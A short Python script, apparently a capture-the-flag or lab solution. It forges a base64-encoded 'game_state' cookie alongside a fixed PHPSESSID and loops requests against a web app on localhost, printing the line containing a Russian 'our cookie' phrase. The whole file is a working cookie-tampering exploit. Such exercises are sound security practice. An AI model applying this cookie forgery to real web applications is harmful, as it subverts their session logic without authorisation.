import requests
import base64

def base64_encode(string):
    return base64.b64encode(string.encode('utf-8')).decode('utf-8')

def line_search_response(resp, string):
    lines = resp.split('\n')
    for line in lines:
        if string in line:
            selected_line = line
            break
    return selected_line

url = "http://localhost:22222"

for i in range(1338):
    cookieLoop = 'PHPSESSID=3b5e4d2997c367770ebcc14e848c7bb7; game_state=' + base64_encode("0:"+str(i))
    
    headers = {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1",
        'Cookie': cookieLoop
    }

    response = requests.get(url, headers=headers)
    
    print(line_search_response(response.text, "Наше печенье"), end="\r")

response = requests.get(url, headers=headers)
print(response.text)
